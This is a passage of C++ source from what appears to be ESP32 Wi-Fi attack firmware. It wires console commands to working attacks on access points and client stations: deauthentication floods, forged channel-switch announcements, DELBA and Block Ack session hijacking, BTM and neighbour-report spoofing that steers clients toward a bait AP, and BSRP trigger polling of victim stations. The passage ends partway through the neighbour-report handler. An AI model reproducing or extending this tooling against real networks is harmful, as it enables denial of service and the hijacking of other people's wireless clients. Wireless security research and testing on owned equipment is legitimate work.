// wbus objects for the commands that have moved onto the bus.
//
// Migration rule for this file: a command may only move here when its reply text
// is reproduced byte for byte, because firmware/tests/ and lab/*.py parse those
// lines. Everything else keeps running through the legacy strcmp chain in
// serial_console.cpp until it gets the same treatment -- one command at a time,
// never a big-bang.
#include <WiFi.h>
#include <ctype.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include <stdio.h>
#include <string.h>

#include "authflood.h"
#include "bsrp.h"
#include "console_commands.h"
#include "csa.h"
#include "deauth.h"
#include "delba.h"
#include "eapol.h"
#include "evil_twin.h"
#include "qosnull.h"
#include "radio.h"
#include "sae.h"
#include "wbus.h"
#include "baitap.h"
#include "btm.h"
#include "rrm.h"

namespace {

// ---- deauth -----------------------------------------------------------------

const wb_arg_spec_t kDeauthStartArgs[] = {
    // Not "required": DEAUTH with no index used to reach do_deauth(-1) and print
    // the index error there. Keeping the default at -1 preserves that text.
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "index out of range, run SCAN first",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "reason",
     .type = WB_T_REASON,
     .flags = 0,
     .enums = nullptr,
     .label = "deauth reason: 1..65535, or random",
     .err = "reason must be 1..65535, or 'random'",
     .def = 1,
     .min = 0,
     .max = 0},
};

wb_err_t deauth_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  uint16_t reason = 1;
  // The reason is applied before the index is checked, matching the legacy order
  // (a bad reason is reported even when the index is bad as well).
  if (!console_apply_reason(wb_arg(args, "reason"), &reason)) return WB_ERR_ARG;
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  if (!attack_deauth_single(index, reason)) {
    wb_reply_line(reply, "ERR cannot start deauth on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK DEAUTH %d %s\n", index, WiFi.SSID(index).c_str());
  console_ui_log("deauth started");
  wbus_emit("deauth.state", "active=1");
  return WB_OK;
}

// One radio, one job: this is the same teardown the STOP command performs, so the
// reply is the STOP line verbatim.
wb_err_t deauth_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  attack_stop();
  wb_reply_printf(reply, "OK STOP deauth_frames=%u probe_frames=%u\n",
                  (unsigned)attack_deauth_frames(), (unsigned)attack_probe_frames());
  console_ui_log("stopped");
  wbus_emit("deauth.state", "active=0");
  return WB_OK;
}

// Defined further down with the other deauth extras; the method table above needs
// them first.
extern const wb_arg_spec_t kDeauthAllArgs[];
extern const wb_arg_spec_t kDeauthListArgs[];
wb_err_t deauth_bus_all(const wb_args_t* args, wb_reply_t* reply);
wb_err_t deauth_bus_only(const wb_args_t* args, wb_reply_t* reply);
wb_err_t deauth_bus_except(const wb_args_t* args, wb_reply_t* reply);

const wb_method_t kDeauthMethods[] = {
    {.name = "start",
     .args = kDeauthStartArgs,
     .n_args = 2,
     .handler = deauth_bus_start,
     .summary = "deauth / disassoc one AP"},
    {.name = "stop",
     .args = nullptr,
     .n_args = 0,
     .handler = deauth_bus_stop,
     .summary = "STOP"},
    {.name = "all",
     .args = kDeauthAllArgs,
     .n_args = 1,
     .handler = deauth_bus_all,
     .summary = "deauth every scanned AP"},
    {.name = "only",
     .args = kDeauthListArgs,
     .n_args = 2,
     .handler = deauth_bus_only,
     .summary = "deauth only the listed scan indexes"},
    {.name = "except",
     .args = kDeauthListArgs,
     .n_args = 2,
     .handler = deauth_bus_except,
     .summary = "deauth every AP except the listed indexes"},
};

// ---- CSA --------------------------------------------------------------------

const wb_arg_spec_t kCsaStartArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: CSA <idx> [new-channel|auto] [count 2-8] [hold-seconds]",
     .def = -1,
     .min = 0,
     .max = 0},
    // "auto" or a channel number. No range check on purpose: the legacy code
    // treats any negative number as auto, and stricter validation would reject
    // commands that used to be accepted.
    {.name = "ch",
     .type = WB_T_ENUM,
     .flags = WB_F_NUMERIC_OK,
     .enums = "auto",
     .label = "new channel, or auto (opposite band)",
     .err = "new channel must be 1..14 or 36..196",
     .def = -1,
     .min = 0,
     .max = 0},
    // cnt/secs keep the handler's own checks (the exact text lives below); the
    // policy only guarantees one tokenizer and typed access.
    {.name = "cnt",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "beacon count 2..8",
     .err = "count must be 2..8 (a real AP counts down)",
     .def = 5,
     .min = 0,
     .max = 0},
    {.name = "secs",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "hold seconds 1..600 (fixed channel only)",
     .err = "hold seconds must be 1..600",
     .def = 15,
     .min = 0,
     .max = 0},
};

// The body of the old do_csa(), unchanged except for the reply sink.
wb_err_t csa_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0) {
    wb_reply_line(reply, "ERR usage: CSA <idx> [new-channel|auto] [count 2-8] [hold-seconds]");
    return WB_ERR_ARG;
  }

  const wb_value_t* ch = wb_arg(args, "ch");
  const bool auto_channel =
      (ch == nullptr) || !ch->present || (ch->text != nullptr && strcmp(ch->text, "auto") == 0);

  // Auto mode is time-based (CSA_AUTO_HOLD_MS per round) and ignores count/hold,
  // exactly as before; a fixed channel keeps the seconds-based one-shot window.
  const long channel = auto_channel ? -1 : ch->num;
  const long count = auto_channel ? 5 : wb_arg_num(args, "cnt");
  const long hold_seconds = auto_channel ? 5 : wb_arg_num(args, "secs");

  if (index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  const bool running_auto = (channel < 0);
  if (!running_auto) {
    const bool is_2g = channel >= 1 && channel <= 14;
    const bool is_5g = channel >= 36 && channel <= 196;
    if (!is_2g && !is_5g) {
      wb_reply_line(reply, "ERR new channel must be 1..14 or 36..196");
      return WB_ERR_ARG;
    }
    if ((long)WiFi.channel(index) == channel) {
      wb_reply_line(reply, "ERR new channel must differ from the AP channel");
      return WB_ERR_ARG;
    }
  }
  if (count < 2 || count > 8) {
    wb_reply_line(reply, "ERR count must be 2..8 (a real AP counts down)");
    return WB_ERR_ARG;
  }
  if (!running_auto && (hold_seconds < 1 || hold_seconds > 600)) {
    wb_reply_line(reply, "ERR hold seconds must be 1..600");
    return WB_ERR_ARG;
  }

  const uint16_t hold_ms =
      running_auto ? (uint16_t)CSA_AUTO_HOLD_MS : (uint16_t)(hold_seconds * 1000);
  if (!csa_start(index, running_auto ? 0 : (uint8_t)channel, (uint8_t)count, hold_ms,
                 running_auto)) {
    wb_reply_line(reply, "ERR cannot start CSA on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK CSA %d %s count=%ld hold=%ums loop=%d ssid=%s\n", index,
                  running_auto ? "auto(opposite-band)" : "fixed", count, (unsigned)hold_ms,
                  running_auto ? 1 : 0, WiFi.SSID(index).c_str());
  console_ui_log("csa started");
  wbus_emit("csa.state", "active=1");
  return WB_OK;
}

wb_err_t csa_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = csa_frames();
  csa_stop();
  wb_reply_printf(reply, "OK CSASTOP frames=%u\n", (unsigned)frames);
  console_ui_log("csa stopped");
  wbus_emit("csa.state", "active=0");
  return WB_OK;
}

wb_err_t csa_bus_test(const wb_args_t*, wb_reply_t*) {
  // The selftest dumps its own hex through csa.cpp; it stays a debug-only path.
  csa_selftest();
  return WB_OK;
}

const wb_method_t kCsaMethods[] = {
    {.name = "start",
     .args = kCsaStartArgs,
     .n_args = 4,
     .handler = csa_bus_start,
     .summary = "CSA spoof (channel switch announce)"},
    {.name = "stop",
     .args = nullptr,
     .n_args = 0,
     .handler = csa_bus_stop,
     .summary = "stop the CSA spoof"},
    {.name = "test",
     .args = nullptr,
     .n_args = 0,
     .handler = csa_bus_test,
     .summary = "dump the CSA action/beacon bytes"},
};

// ---- DELBA ------------------------------------------------------------------

const wb_arg_spec_t kDelbaStartArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: DELBA <idx> [reason]",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "reason",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "reason code: 1, 32, 37, 38, 39 (default 37)",
     .err = "reason must be one of 1, 32, 37, 38, 39",
     .def = 37,
     .min = 0,
     .max = 0},
};

wb_err_t delba_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0) {
    wb_reply_line(reply, "ERR usage: DELBA <idx> [reason]");
    return WB_ERR_ARG;
  }
  const long reason_value = wb_arg_num(args, "reason");
  if (reason_value < 0 || reason_value > 65535) {
    wb_reply_line(reply, "ERR reason must be one of 1, 32, 37, 38, 39");
    return WB_ERR_ARG;
  }
  const uint16_t reason = (uint16_t)reason_value;
  if (index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  if (!delba_reason_is_defined(reason)) {
    wb_reply_line(reply, "ERR reason must be one of 1, 32, 37, 38, 39");
    return WB_ERR_ARG;
  }
  attack_stop();
  if (!delba_start(index, reason)) {
    wb_reply_line(reply, "ERR cannot start DELBA on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK DELBA %d reason=%u ch=%u ssid=%s\n", index, (unsigned)reason,
                  (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
  console_ui_log("delba started");
  wbus_emit("delba.state", "active=1");
  return WB_OK;
}

wb_err_t delba_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = delba_frames();
  delba_stop();
  wb_reply_printf(reply, "OK DELBASTOP frames=%u\n", (unsigned)frames);
  console_ui_log("delba stopped");
  wbus_emit("delba.state", "active=0");
  return WB_OK;
}

wb_err_t delba_bus_test(const wb_args_t*, wb_reply_t*) {
  delba_selftest();
  return WB_OK;
}

const wb_method_t kDelbaMethods[] = {
    {.name = "start",
     .args = kDelbaStartArgs,
     .n_args = 2,
     .handler = delba_bus_start,
     .summary = "DELBA spoof: tear down Block Ack sessions"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = delba_bus_stop, .summary = "stop the DELBA spoof"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = delba_bus_test, .summary = "dump the DELBA action frame bytes"},
};

// ---- BA session hijack ------------------------------------------------------

// `step` is validated by the handler (0..2047, 0..127 = control run) so the two
// variants can keep their own wording.

const wb_arg_spec_t kBaAttackArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: BAATTACK <idx> [step 128-2047]",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "step",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "window offset 0..2047 (0..127 = control run)",
     .err = nullptr,
     .def = 512,
     .min = 0,
     .max = 0},
};

const wb_arg_spec_t kBaPlantArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: BAPLANT <idx> [step 0-2047]",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "step",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "window offset 0..2047 (0..127 = control run)",
     .err = nullptr,
     .def = 512,
     .min = 0,
     .max = 0},
};

const wb_arg_spec_t kBaPushArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: BARPUSH <idx> [step 0-2047]",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "step",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "window offset 0..2047 (0..127 = control run)",
     .err = nullptr,
     .def = 512,
     .min = 0,
     .max = 0},
};

// Shared pre-checks in the legacy order: index, then step, then "one radio, one job".
bool ba_prepare(const wb_args_t* args, wb_reply_t* reply, const char* usage, const char* step_err,
                int* index, long* step) {
  *index = (int)wb_arg_num(args, "idx");
  *step = wb_arg_num(args, "step");
  if (*index < 0) {
    char line[96];
    snprintf(line, sizeof(line), "ERR %s", usage);
    wb_reply_line(reply, line);
    return false;
  }
  if (*index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return false;
  }
  if (*step < 0 || *step > 2047) {
    wb_reply_line(reply, step_err);
    return false;
  }
  attack_stop();
  return true;
}

wb_err_t ba_bus_attack(const wb_args_t* args, wb_reply_t* reply) {
  int index = 0;
  long step = 0;
  if (!ba_prepare(args, reply, "usage: BAATTACK <idx> [step 128-2047]",
                  "ERR step must be 0..2047 (0..127 = control run, the window is not moved)",
                  &index, &step)) {
    return WB_ERR_ARG;
  }
  if (!delba_start_ba(index, (uint16_t)step)) {
    wb_reply_line(reply, "ERR cannot start the BA attack on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK BAATTACK %d step=%ld ch=%u ssid=%s\n", index, step,
                  (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
  console_ui_log("ba attack started");
  wbus_emit("ba.state", "active=1");
  return WB_OK;
}

wb_err_t ba_bus_plant(const wb_args_t* args, wb_reply_t* reply) {
  int index = 0;
  long step = 0;
  if (!ba_prepare(args, reply, "usage: BAPLANT <idx> [step 0-2047]",
                  "ERR step must be 0..2047 (0..127 = control run)", &index, &step)) {
    return WB_ERR_ARG;
  }
  if (!delba_ba_plant_once(index, (uint16_t)step)) {
    wb_reply_line(reply, "ERR cannot start the BA plant on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK BAPLANT %d step=%ld ch=%u\n", index, step,
                  (unsigned)WiFi.channel(index));
  console_ui_log("ba plant started");
  return WB_OK;
}

wb_err_t ba_bus_push(const wb_args_t* args, wb_reply_t* reply) {
  int index = 0;
  long step = 0;
  if (!ba_prepare(args, reply, "usage: BARPUSH <idx> [step 0-2047]",
                  "ERR step must be 0..2047 (0..127 = control run)", &index, &step)) {
    return WB_ERR_ARG;
  }
  if (!delba_ba_bar_once(index, (uint16_t)step)) {
    wb_reply_line(reply, "ERR cannot start the BAR push on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK BARPUSH %d step=%ld ch=%u\n", index, step,
                  (unsigned)WiFi.channel(index));
  console_ui_log("bar push started");
  return WB_OK;
}

wb_err_t ba_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t delba_n = delba_ba_delba_frames();
  const uint32_t addba_n = delba_ba_addba_frames();
  const uint32_t bar_n = delba_ba_bar_frames();
  delba_stop();
  wb_reply_printf(reply, "OK BASTOP delba=%u addba=%u bar=%u\n", (unsigned)delba_n,
                  (unsigned)addba_n, (unsigned)bar_n);
  console_ui_log("ba attack stopped");
  wbus_emit("ba.state", "active=0");
  return WB_OK;
}

wb_err_t ba_bus_test(const wb_args_t*, wb_reply_t*) {
  delba_ba_selftest();
  return WB_OK;
}

wb_err_t ba_bus_tx(const wb_args_t*, wb_reply_t*) {
  static const uint8_t probe_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
  delba_ba_tx_probe(probe_mac);
  return WB_OK;
}

const wb_method_t kBaMethods[] = {
    {.name = "attack",
     .args = kBaAttackArgs,
     .n_args = 2,
     .handler = ba_bus_attack,
     .summary = "BA-session hijack: DELBA -> forged ADDBA -> BAR"},
    {.name = "plant",
     .args = kBaPlantArgs,
     .n_args = 2,
     .handler = ba_bus_plant,
     .summary = "plant the reorder window once, then stay silent"},
    {.name = "push",
     .args = kBaPushArgs,
     .n_args = 2,
     .handler = ba_bus_push,
     .summary = "send only BARs, then stay silent"},
    {.name = "tx", .args = nullptr, .n_args = 0, .handler = ba_bus_tx, .summary = "one DELBA/ADDBA/BAR + driver verdict"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = ba_bus_stop, .summary = "stop the BA hijack"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = ba_bus_test, .summary = "dump the forged ADDBA / BAR bytes"},
};

// ---- shared helpers ---------------------------------------------------------

void mac_text(const uint8_t mac[6], char out[18]) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4],
           mac[5]);
}

// ---- BTM (802.11v BTM Request) ----------------------------------------------

const wb_arg_spec_t kBtmStartArgs[] = {
    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
    {.name = "timer", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "disassociation timer in TBTT (1..65535, default 10)", .err = nullptr, .def = 10,
     .min = 0, .max = 0},
    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
     .label = "target station MAC (optional)", .err = "station MAC must look like AABBCCDDEEFF",
     .def = 0, .min = 0, .max = 0},
    {.name = "cand", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
     .label = "candidate BSSID to steer to (optional; omit = no candidate list)",
     .err = "candidate BSSID must look like AABBCCDDEEFF", .def = 0, .min = 0, .max = 0},
    {.name = "cand-ch", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "candidate channel, 0 = look it up in the scan results", .err = nullptr, .def = 0,
     .min = 0, .max = 0},
    {.name = "cand-info", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "BSSID Information word, 0 until a real frame says otherwise", .err = nullptr,
     .def = 0, .min = 0, .max = 2147483647},
};

wb_err_t btm_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  const long timer = wb_arg_num(args, "timer");
  if (timer < 1 || timer > 65535) {
    wb_reply_line(reply, "ERR timer must be 1..65535 TBTT (0 disables the client's scan)");
    return WB_ERR_ARG;
  }
  uint8_t sta[6];
  const bool have_sta = wb_arg_mac(args, "sta", sta);

  // 可选候选：给了 BSSID 就一定要有信道。0 表示"从扫描结果里按 BSSID 找"，
  // 找不到就报错而不是瞎填一个——元素里的信道写错了，客户端扫的就是别处。
  uint8_t cand[6];
  bool have_cand = wb_arg_mac(args, "cand", cand);
  long cand_ch = wb_arg_num(args, "cand-ch");
  const uint32_t cand_info = (uint32_t)wb_arg_num(args, "cand-info");
  // No candidate given but the bait AP is up: aim the request at it. Measured on an
  // ESP32-C5 station, a list-less request is answered but never acted on -- the
  // station only moves when it is pointed at a BSS it can actually join.
  if (!have_cand && baitap_running()) {
    baitap_bssid(cand);
    have_cand = true;
    cand_ch = baitap_channel();
  }
  if (have_cand) {
    if (cand_ch == 0) {
      const int n = console_scan_count();
      for (int i = 0; i < n; i++) {
        const uint8_t* b = WiFi.BSSID(i);
        if (b != nullptr && memcmp(b, cand, 6) == 0) {
          cand_ch = WiFi.channel(i);
          break;
        }
      }
    }
    if (cand_ch < 1 || cand_ch > 196) {
      wb_reply_line(reply,
                    "ERR candidate channel unknown: run SCAN while that BSS is up, or pass "
                    "cand-ch=<1..196>");
      return WB_ERR_ARG;
    }
  }

  // The bait AP pins the radio: starting the spoof on another channel would drag
  // the AP, and any station that already roamed onto it, off the air.
  if (baitap_running() && baitap_channel() != (uint8_t)WiFi.channel(index)) {
    wb_reply_line(reply,
                  "ERR bait AP is on another channel: restart BAITAP on this AP's channel");
    return WB_ERR_STATE;
  }

  attack_stop();
  if (!btm_start(index, (uint16_t)timer, have_cand ? cand : nullptr, (uint8_t)cand_ch,
                 cand_info)) {
    wb_reply_line(reply, "ERR cannot start the BTM spoof on that network");
    return WB_ERR_STATE;
  }
  if (have_sta) {
    btm_add_station(sta);
    char text[18];
    mac_text(sta, text);
    wb_reply_printf(reply, "OK BTMSTA %s\n", text);
  }
  if (have_cand) {
    char cand_text[18];
    mac_text(cand, cand_text);
    wb_reply_printf(reply, "OK BTM %d timer=%u cand=%s ch=%ld info=0x%08X ssid=%s\n", index,
                    (unsigned)timer, cand_text, cand_ch, (unsigned)cand_info,
                    WiFi.SSID(index).c_str());
  } else {
    wb_reply_printf(reply, "OK BTM %d timer=%u ssid=%s\n", index, (unsigned)timer,
                    WiFi.SSID(index).c_str());
  }
  console_ui_log("btm started");
  wbus_emit("btm.state", "active=1");
  return WB_OK;
}

wb_err_t btm_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = btm_frames();
  const uint32_t responses = btm_responses();
  btm_stop();
  wb_reply_printf(reply, "OK BTMSTOP frames=%u responses=%u last_status=%u\n", (unsigned)frames,
                  (unsigned)responses, (unsigned)btm_last_status());
  console_ui_log("btm stopped");
  wbus_emit("btm.state", "active=0");
  return WB_OK;
}

wb_err_t btm_bus_test(const wb_args_t*, wb_reply_t*) {
  btm_selftest();
  return WB_OK;
}

const wb_method_t kBtmMethods[] = {
    {.name = "start", .args = kBtmStartArgs, .n_args = 6, .handler = btm_bus_start,
     .summary = "802.11v BTM Request spoof"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = btm_bus_stop, .summary = "stop the BTM spoof"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = btm_bus_test, .summary = "dump the BTM Request bytes"},
};

// ---- BSRP (HE Buffer Status Report Poll Trigger) ----------------------------

const wb_arg_spec_t kBsrpStartArgs[] = {
    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
    {.name = "aid", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "victim AID12 from an association response or real Trigger", .err = nullptr,
     .def = 0, .min = 0, .max = 0},
    {.name = "ch", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "victim BSS channel; must match the selected AP", .err = nullptr, .def = 0,
     .min = 0, .max = 0},
    {.name = "rate", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "milliseconds between polls; values below 45 are raised", .err = nullptr,
     .def = 5, .min = 0, .max = 0},
    {.name = "count", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "successful transmissions, 0 = until BSRPSTOP", .err = nullptr, .def = 0,
     .min = 0, .max = 0},
    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
     .label = "victim station MAC (optional; otherwise learned by AID)",
     .err = "station MAC must look like AABBCCDDEEFF", .def = 0, .min = 0, .max = 0},
};

wb_err_t bsrp_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  const long aid = wb_arg_num(args, "aid");
  if (aid < 1 || aid > 2007) {
    wb_reply_line(reply, "ERR aid must be 1..2007");
    return WB_ERR_ARG;
  }
  const long ch = wb_arg_num(args, "ch");
  if (ch < 1 || ch > 196) {
    wb_reply_line(reply, "ERR channel must be 1..196");
    return WB_ERR_ARG;
  }
  if (ch != WiFi.channel(index)) {
    wb_reply_printf(reply, "ERR channel must match the selected AP channel (%d)\n",
                    (int)WiFi.channel(index));
    return WB_ERR_ARG;
  }
  const long rate = wb_arg_num(args, "rate");
  if (rate < 1 || rate > 60000) {
    wb_reply_line(reply, "ERR rate_ms must be 1..60000");
    return WB_ERR_ARG;
  }
  const long count = wb_arg_num(args, "count");
  if (count < 0 || count > 1000000) {
    wb_reply_line(reply, "ERR count must be 0..1000000");
    return WB_ERR_ARG;
  }
  if (baitap_running() && baitap_channel() != (uint8_t)ch) {
    wb_reply_line(reply,
                  "ERR bait AP is on another channel: restart BAITAP on this AP's channel");
    return WB_ERR_STATE;
  }
  uint8_t sta[6];
  const bool have_sta = wb_arg_mac(args, "sta", sta);
  attack_stop();
  if (!bsrp_start(index, (uint16_t)aid, (uint8_t)ch, (uint32_t)rate, (uint32_t)count,
                  have_sta ? sta : nullptr)) {
    wb_reply_line(reply, "ERR cannot start BSRP on that network");
    return WB_ERR_STATE;
  }
  if (rate < 45) {
    wb_reply_printf(reply, "INFO BSRP rate_ms=%ld raised to 45 by the unicast TX guard\n", rate);
  }
  if (have_sta) {
    char text[18];
    mac_text(sta, text);
    wb_reply_printf(reply, "OK BSRPSTA %s\n", text);
  } else {
    wb_reply_line(reply, "INFO BSRP waiting for an Association Response or real BSRP with this AID");
  }
  wb_reply_printf(reply, "OK BSRP %d aid=%ld ch=%ld rate=%u count=%ld ssid=%s\n", index, aid, ch,
                  (unsigned)bsrp_rate_ms(), count, WiFi.SSID(index).c_str());
  console_ui_log("bsrp started");
  wbus_emit("bsrp.state", "active=1");
  return WB_OK;
}

wb_err_t bsrp_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = bsrp_frames();
  const uint32_t errors = bsrp_tx_errors();
  bsrp_stop();
  wb_reply_printf(reply, "OK BSRPSTOP frames=%u tx_errors=%u references=%u\n",
                  (unsigned)frames, (unsigned)errors, (unsigned)bsrp_reference_triggers());
  console_ui_log("bsrp stopped");
  wbus_emit("bsrp.state", "active=0");
  return WB_OK;
}

wb_err_t bsrp_bus_test(const wb_args_t*, wb_reply_t*) {
  bsrp_selftest();
  return WB_OK;
}

const wb_method_t kBsrpMethods[] = {
    {.name = "start", .args = kBsrpStartArgs, .n_args = 6, .handler = bsrp_bus_start,
     .summary = "HE BSRP Trigger poll (frame-level; core fields await a reference capture)"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = bsrp_bus_stop,
     .summary = "stop the BSRP poll"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = bsrp_bus_test,
     .summary = "dump and annotate the BSRP Trigger bytes"},
};

// ---- RRM (802.11k Neighbor Report Response) ---------------------------------

const wb_arg_spec_t kRrmStartArgs[] = {
    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
    {.name = "sub", .type = WB_T_ENUM, .flags = 0, .enums = "nbr",
     .label = "the only subcommand for now: nbr = Neighbor Report Response",
     .err = "subcommand must be 'nbr' (Neighbor Report Response)", .def = 0, .min = 0, .max = 0},
    {.name = "bssid", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
     .label = "BSSID announced as the phantom neighbour",
     .err = "neighbour BSSID must look like AABBCCDDEEFF", .def = 0, .min = 0, .max = 0},
    {.name = "ch", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "channel of the phantom neighbour, 1..196", .err = nullptr, .def = 0, .min = 0,
     .max = 0},
    {.name = "count", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "frames to inject in total, 0 = until RRMSTOP", .err = nullptr, .def = 1, .min = 0,
     .max = 16},
    {.name = "token", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "dialog token 0..255", .err = nullptr, .def = 0, .min = 0, .max = 255},
    {.name = "info", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "BSSID Information word, 0 until a real frame says otherwise", .err = nullptr,
     .def = 0, .min = 0, .max = 2147483647},
    {.name = "opclass", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "operating class, 0 until a real frame says otherwise", .err = nullptr, .def = 0,
     .min = 0, .max = 255},
    {.name = "phy", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "PHY type, 0 until a real frame says otherwise", .err = nullptr, .def = 0, .min = 0,
     .max = 255},
    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
     .label = "target station MAC (optional)", .err = "station MAC must look like AABBCCDDEEFF",
     .def = 0, .min = 0, .max = 0},
};

wb_err_t rrm_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  uint8_t cand[6];
  if (!wb_arg_mac(args, "bssid", cand)) {
    wb_reply_line(reply, "ERR neighbour BSSID must look like AABBCCDDEEFF");
    return WB_ERR_ARG;
  }
  const long ch = wb_arg_num(args, "ch");
  if (ch < 1 || ch > 196) {
    wb_reply_line(reply, "ERR candidate channel must be 1..196");
    return WB_ERR_ARG;
  }
  const long count = wb_arg_num(args, "count");
  const long token = wb_arg_num(args, "token");
  const uint32_t info = (uint32_t)wb_arg_num(args, "info");
  const long opclass = wb_arg_num(args, "opclass");
  const long phy = wb_arg_num(args, "phy");
  uint8_t sta[6];
  const bool have_sta = wb_arg_mac(args, "sta", sta);
  // Same rule as BTM: the injector pins the target AP's channel, so a bait AP
  // elsewhere would be dragged off the air by this start.
  if (baitap_running() && baitap_channel() != (uint8_t)WiFi.channel(index)) {
    wb_reply_line(reply,
                  "ERR bait AP is on another channel: restart BAITAP on this AP's channel");
    return WB_ERR_STATE;
  }
  attack_stop();
  if (!rrm_start(index, cand, (uint8_t)ch, (uint8_t)count, (uint8_t)token, info, (uint8_t)opclass,
                 (uint8_t)phy)) {
    wb_reply_line(reply, "ERR cannot start the Neighbor Report spoof on that network");
    return WB_ERR_STATE;
  }
  if (have_sta) {
    rrm_add_station(sta);
    char text[18];
    mac_text(sta, text);
    wb_reply_printf(reply, "OK RRMSTA %s\n", text);
  }
  char cand_text[18];
  mac_text(cand, cand_text);
